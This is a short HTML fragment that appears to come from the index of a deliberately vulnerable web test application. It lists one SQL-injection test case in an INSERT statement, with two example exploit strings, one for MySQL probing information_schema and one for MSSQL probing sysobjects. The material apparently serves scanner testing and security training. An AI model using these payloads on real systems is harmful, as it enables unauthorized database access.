...
<B><a href="Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp">Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp</a></B><br>
  ...
  MySQL Exploit (NON ANSI Mode): ',(SELECT '1' FROM information_schema.`TABLES` WHERE TABLE_NAME like'FILES'))--  <br>
  MSSQL Exploit (NO Comment): '+(SELECT 'a' FROM sysobjects WHERE name like'sysusers')+' <br>
  <br>
